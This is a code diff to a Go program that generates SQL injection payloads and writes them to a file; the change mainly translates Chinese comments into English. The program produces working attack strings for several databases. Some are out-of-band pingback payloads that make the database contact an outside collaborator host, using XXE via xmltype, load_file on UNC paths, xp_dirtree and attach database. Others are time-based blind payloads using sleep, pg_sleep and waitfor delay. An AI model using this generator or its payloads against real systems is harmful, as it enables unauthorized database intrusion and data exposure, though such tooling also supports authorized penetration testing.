@@ -7,8 +7,9 @@ import (
 	"strings"
 )
 
-// 修改后的payload生成逻辑（去依赖版）
+// Payload construction components
 var (
+	// Expression wrapping templates for different injection contexts
 	expressionEmbeddings = []func(string) string{
 		func(s string) string { return `'||(` + s + `)||'` },
 		func(s string) string { return `"||(` + s + `)||"` },
@@ -16,6 +17,7 @@ var (
 		func(s string) string { return s },
 	}
 
+	// Statement termination patterns for various SQL dialects
 	statementEmbeddings = []func(string) string{
 		func(s string) string { return `';` + s + `--` },
 		func(s string) string { return `";` + s + `--` },
@@ -24,39 +26,43 @@ var (
 		func(s string) string { return s },
 	}
 
+	// Encoding handlers for different parameter contexts
 	escapers = []func(string) string{
-		func(s string) string { return s },
-		url.QueryEscape,
-		url.PathEscape,
+		func(s string) string { return s },          // Raw
+		url.QueryEscape,                             // URL query encoding
+		url.PathEscape,                              // URL path encoding
 	}
 )
 
+// Convert expression to executable statement
 func expressionToStatement(s string) string {
 	return `select (` + s + `);`
 }
 
-// 通用域名占位符
+// Placeholder for collaborator domain
 const collabDomain = "{COLLAB_DOMAIN}"
 
-// 改造后的pingback生成函数
+// Generate OOB pingback payloads with domain placeholder
 func generatePingbackPayloads() []string {
 	var payloads []string
 
+	// OOB detection templates with injection characteristics
 	pingbackTemplates := []struct {
-		template string
-		escape   bool
+		template string    // Injection pattern
+		escape   bool      // Whether to escape dots for SQL concatenation
 	}{
-		// XML外部实体
+		// XML External Entity (XXE) based detection
 		{`extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %% nswjq SYSTEM "http://%s/">%%nswjq;]>'),'/l')`, true},
 		
-		// 文件加载
+		// File operation based detection
 		{`load_file('\\\\%s\\test')`, true},
 		
-		// SQL Server命令
+		// SQL Server specific commands
 		{`declare @q varchar(99);set @q='\\%s\\test'; exec master.dbo.xp_dirtree @q;`, true},
 		{`attach database '\\\\%s\\test';`, true},
 	}
 
+	// Generate all payload variations
 	for _, escaper := range escapers {
 		for _, embed := range expressionEmbeddings {
 			for _, tpl := range pingbackTemplates {
@@ -74,31 +80,33 @@ func generatePingbackPayloads() []string {
 	return unique(payloads)
 }
 
-// 改造后的延时payload生成（支持1-10秒）
+// Generate time-based delay payloads (1-10 seconds)
 func generateDelayPayloads() []string {
 	var payloads []string
 
+	// Database-specific delay patterns
 	delayTemplates := []struct {
-		template string
-		seconds  int
+		template string  // Delay syntax template
+		seconds  int     // Parameter position for seconds
 	}{
-		// MySQL
+		// MySQL sleep function
 		{"sleep(%d)", 1},
-		// SQLite
+		// SQLite pseudo-delay
 		{"usleep(%d000000)", 1},
-		// PostgreSQL 
+		// PostgreSQL sleep
 		{"pg_sleep(%d)", 1},
-		// SQL Server
+		// SQL Server waitfor
 		{"waitfor delay '00:00:%02d'", 1},
 	}
 
+	// Generate payloads for 1-10 second delays
 	for seconds := 1; seconds <= 10; seconds++ {
 		for _, escaper := range escapers {
 			for _, embed := range expressionEmbeddings {
 				for _, tpl := range delayTemplates {
 					raw := fmt.Sprintf(tpl.template, seconds)
 					if strings.Contains(raw, ")") {
-						raw += "+1" // 保持语句有效性
+						raw += "+1" // Maintain query validity
 					}
 					payload := escaper(embed(raw))
 					payloads = append(payloads, payload)
@@ -110,7 +118,7 @@ func generateDelayPayloads() []string {
 	return unique(payloads)
 }
 
-// 去重工具函数
+// Deduplication utility function
 func unique(strs []string) []string {
 	seen := make(map[string]bool)
 	result := []string{}
@@ -124,24 +132,25 @@ func unique(strs []string) []string {
 }
 
 func main() {
-	// 生成payloads
+	// Generate payload sets
 	pingbacks := generatePingbackPayloads()
 	delays := generateDelayPayloads()
 
-	// 合并结果
+	// Combine results
 	allPayloads := append(pingbacks, delays...)
 
-	// 写入文件
+	// Create output file
 	file, err := os.Create("sql_payloads.txt")
 	if err != nil {
 		panic(err)
 	}
 	defer file.Close()
 
+	// Write payloads to file
 	for _, p := range allPayloads {
 		file.WriteString(p + "\n")
 	}
 
-	fmt.Printf("Generated %d payloads (Pingback:%d | Delay:%d)\n", 
+	fmt.Printf("Generated %d payloads (OOB:%d | Time-based:%d)\n", 
 		len(allPayloads), len(pingbacks), len(delays))
 }
